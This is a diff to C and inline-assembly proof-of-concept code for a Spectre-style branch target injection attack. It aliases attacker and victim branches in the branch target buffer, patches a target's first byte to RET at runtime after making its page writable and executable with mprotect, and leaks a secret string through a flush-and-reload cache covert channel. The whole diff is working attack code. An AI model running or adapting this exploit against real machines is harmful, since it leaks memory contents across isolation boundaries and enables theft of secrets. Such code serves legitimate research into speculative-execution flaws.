@@ -29,6 +29,8 @@ enum training_mode {
 #define NUM_ELEMENTS 256
 uint8_t covert_channel[NUM_ELEMENTS * ELEMENT_PADDING];
 
+#define RET 0xC3
+
 char *secret = "L Lag gaye";
 
 void malicious_target();
@@ -47,7 +49,7 @@ void malicious_target();
       "movq (%rax), %rbx\n"
       /* When specualting, stop here. */
       "lfence\n"
-      "jmp continue_bti\n"
+      "ret\n"
  );
 
 void benign_target();
@@ -55,13 +57,14 @@ asm (
   "benign_target:\n"
   /* Stop here on speculation to prevent any other side effects. */
   "lfence\n"
-  "jmp continue_bti\n"
+  "ret\n"
 );
 
 /* These two addresses are carefully chosen to alias in the BTB. */
 #define VICTIM_BRANCH_ADDRESS 0x41bababababf
 #define ATTACKER_BRANCH_ADDRESS 0x41aaba3a9ae2
 
+void continue_bti();
 /* The instructions are relocated at runtime to
  * addresses that collide in the BTB. The other
  * alternative would be to place them in an assembly file
@@ -72,7 +75,9 @@ void victim_insns__end();
 asm (
   ".align 0x80000\n"
   "victim_insns:\n"
-  "jmp *(%r11)\n"
+  "call *(%r11)\n"
+  NOPS_str(0x40)
+  "ret\n"
   "victim_insns__end:\n"
 );
 
@@ -81,11 +86,13 @@ void attacker_insns__end();
 asm (
   ".align 0x80000\n"
   "attacker_insns:\n"
-  "jmp *(%r11)\n"
+  "call *(%r11)\n"
+  NOPS_str(0x40)
+  "ret\n"
   "attacker_insns__end:\n"
 );
 
-void flush_covert_channel() {
+static inline void flush_covert_channel() {
   for (int i = 0; i < NUM_ELEMENTS; i++)
     _mm_clflush(&covert_channel[i * ELEMENT_PADDING]);
 }
@@ -96,6 +103,7 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
   int hits[NUM_ELEMENTS];
   int winner, runner_up;
 
+  uint8_t saved_first_byte_malicious_target = *(uint8_t *)(malicious_target);
   enum training_mode training_sequence[6] = {TRAIN};
   training_sequence[5] = ATTACK;
 
@@ -114,8 +122,22 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
     flush_covert_channel();
 
     for (int i = 0; i < 6; i++) {
+        if (training_sequence[i] == ATTACK) {
+          /* Here, the benign target is executed speculatively, but the BPU is
+           * trained to speculate to malicious_target So, the RET instructionis
+           * changed back to the original byte so that the secret dependent load
+           * can be executed speculatively.
+           */
+          *(uint8_t *)(malicious_target) = saved_first_byte_malicious_target;
+          target = benign_target;
+        } else {
+          /* During the training phase, `malicious_target` is executed
+           * architecturally, so the first byte is replaced with a `RET`.
+           */
+          *(uint8_t *)(malicious_target) = RET;
+          target = malicious_target;
+        }
 
-      target = (training_sequence[i] == TRAIN) ? malicious_target : benign_target;
       __asm__ volatile(
         /* Move the value of 'secret' into register RDI (first argument). */
         "mov %[leak_addr], %%rdi\n"
@@ -130,12 +152,15 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
          * register RAX.
          */
         "mov (%[pointer_to_target]), %%r11\n"
+        "here:\n"
+        "push %[label]\n"
         "push %[icall]\n"
         "ret\n"
         : /* No output operands */
         : [pointer_to_target] "r"(&pointer_to_target),
           [leak_addr] "r"(secret_addr),
           [covert_channel] "r"(covert_channel),
+          [label] "r" (continue_bti),
           [icall] "r" (training_sequence[i] == TRAIN ? ATTACKER_BRANCH_ADDRESS : VICTIM_BRANCH_ADDRESS)
         : "rax", "rdi", "rsi", "r11", "rax");
         asm("continue_bti:\n");
@@ -184,10 +209,29 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
   result++;
 }
 
+int make_target_writeable(void *malicious_target) {
+  long page_size = sysconf(_SC_PAGESIZE);
+  if (page_size == -1) {
+    perror("sysconf(_SC_PAGESIZE)");
+    return -1;
+  }
+
+  /* TODO: Using 64 as a best guess as 64 is the size of the cache line,
+   * mprotect may just mark the whole page as writeable.
+   */
+  void *aligned_target = (void *)((long)malicious_target & (~(page_size - 1)));
+
+  if (mprotect(aligned_target, 64, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
+    perror("mprotect");
+    return -1;
+  }
+
+  return 0;
+}
 
 int main() {
   /* Pin to CPU 0 */
-  set_cpu_affinity(12);
+  set_cpu_affinity(24);
 
   size_t victim_insns__size = victim_insns__end - victim_insns;
   size_t attacker_insns__size = attacker_insns__end - attacker_insns;
@@ -206,6 +250,11 @@ int main() {
 
   memcpy((void *)VICTIM_BRANCH_ADDRESS, victim_insns, victim_insns__size);
   memcpy((void *)ATTACKER_BRANCH_ADDRESS, attacker_insns, attacker_insns__size);
+
+  if (make_target_writeable(malicious_target) != 0) {
+    printf(
+        "Unable to change permissions (mprotect(RWX)) of the malicious target");
+  }
 
   char result[2];
   int score[2];
